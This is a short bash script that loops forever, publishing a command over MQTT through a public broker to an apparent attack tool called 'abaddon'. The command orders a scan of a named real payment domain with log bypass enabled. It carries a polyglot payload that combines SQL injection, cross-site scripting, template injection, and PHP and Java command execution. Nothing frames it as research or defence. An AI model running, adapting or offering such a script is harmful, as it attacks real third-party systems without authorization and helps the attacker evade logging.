#!/usr/bin/env bash
while :; do
  mosquitto_pub -h broker.hivemq.com -p 1883 -t abaddon/commands -m '{"action":"scan","target":"ebanx.com","force-param":"user","force-place":"query","verbose":true,"bypass-log":true,"force-payload":"'\''+OR+1=1--%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E{{7*7}}${7*7}{7*7}{{7+7}}${7+7}{7+7}%3Csvg%2Fonload=1%3E%3C?php system('\''id'\'');?%3E${T(java.lang.Runtime).getRuntime().exec('\''id'\'')}%3C%25=7*7%25%25{{request.application.__globals__[__import__]{os}.system('\''id'\'')}}%3C%25debug%25%7B%7B7*7%7D%7D${7*7}{{7*7}}{{7<<7}}{{7>>7}}%22;sleep(5)%3C!--<img/src=x onerror=prompt(1)>%22%3"}'
done
